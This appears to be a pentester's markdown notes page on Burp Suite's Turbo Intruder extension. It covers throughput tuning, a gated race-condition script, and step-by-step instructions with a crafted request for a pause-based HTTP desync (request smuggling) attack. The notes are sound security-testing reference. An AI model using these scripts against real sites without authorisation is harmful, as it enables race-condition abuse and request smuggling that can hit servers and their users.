# Turbo Intruder
The BurpSuite extension to be able to do more intruder stuff.

- Use `%s` in the target request to mark payload positions.

It uses python. And the user can define the algorithm of two functions.
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False
                           )
```
and 
```python
def handleResponse(req, interesting):
    table.add(req)
```

These functions are kinda straightforward. The first one queues and sends the requests, and the second one handles the responses it gets.

### Speed
The speed of these basic settings is 8 requests/second:
```python
    concurrentConnections=1,
    requestsPerConnection=1,
    pipeline=False
```

By changing concurrentConnections to 25, the speed becomes 39 requests/second:
```python
    concurrentConnections=25,
    requestsPerConnection=1,
    pipeline=False
```

By changing requestsPerConnection to 100, the speed becomes 869 requests/second:
```python
    concurrentConnections=25,
    requestsPerConnection=100,
    pipeline=False
```

By setting pipelining to true, the speed becomes 1785 requests/second:
```python
    concurrentConnections=25,
    requestsPerConnection=100,
    pipeline=True
```

## Race conditions | Parallel requests
For race conditions where you have to send multiple packets at the same time, while you can brute force through some (word)list while sending them. It can probably only hold like 20~30 requests at the same time, so any more will probably not work. 

```python
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
    for word in wordlists.clipboard:
        engine.queue(target.req, word, gate='race1')

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
```

## Pause Based Desync Attack
Sometimes, a pause withing the sending of the request can cause a desync attack vector. Take a look [here](../web/smuggling.md#desync--pause-based).

1. In Burp Turbo Intruder, create a request like this:
```
POST /example HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```

2. In the python editor panel, adjust the request engine configuration to set these options:
```python
concurrentConnections=1,
requestsPerConnection=100,
pipeline=False,
engine=Engine.THREADED
```

3. Add extra arguments to the `engine.queue()` function something like this:
```python
engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=60000) # Adjust for needs
```

4. Just also queue a normal follow-up request as normal:
```python
followUp = 'GET / HTTP/1.1\r\nHost: vulnerable-website.com\r\n\r\n'
engine.queue(followUp)
```

After the delay you specified in step 3, you should get two responses. If the latter response matches what you expected from the smuggled prefix, this strongly suggests that the desync was succesful.